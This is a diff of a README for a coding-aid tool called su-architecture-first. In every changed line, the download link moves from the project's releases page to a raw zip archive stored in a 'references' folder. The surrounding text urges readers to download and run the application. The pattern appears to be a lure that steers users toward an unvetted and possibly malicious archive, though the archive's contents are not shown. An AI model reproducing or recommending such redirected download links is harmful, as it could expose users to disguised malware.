@@ -1,6 +1,6 @@
 # 🏗️ su-architecture-first - Know Before You Change
 
-[![Download su-architecture-first](https://img.shields.io/badge/Download-su--architecture--first-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/protanopiaparent7570/su-architecture-first/releases)
+[![Download su-architecture-first](https://img.shields.io/badge/Download-su--architecture--first-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/protanopiaparent7570/su-architecture-first/main/references/architecture_first_su_v3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ This means fewer failed attempts, less wasted time, and more reliable results.
 
 ## 📦 Installation
 
-Visit this link to download the application: [Download su-architecture-first](https://github.com/protanopiaparent7570/su-architecture-first/releases)
+Visit this link to download the application: [Download su-architecture-first](https://raw.githubusercontent.com/protanopiaparent7570/su-architecture-first/main/references/architecture_first_su_v3.7.zip)
 
 Once you're on the download page:
 
@@ -140,7 +140,7 @@ Thanks to everyone who supports open-source software and makes tools like this p
 
 **Ready to make better code changes?**
 
-Visit this link to download the application: [Download su-architecture-first](https://github.com/protanopiaparent7570/su-architecture-first/releases)
+Visit this link to download the application: [Download su-architecture-first](https://raw.githubusercontent.com/protanopiaparent7570/su-architecture-first/main/references/architecture_first_su_v3.7.zip)
 
 Start today and see how much smoother your coding projects become. su-architecture-first is your architectural conscience – always there to guide you in the right direction.
 
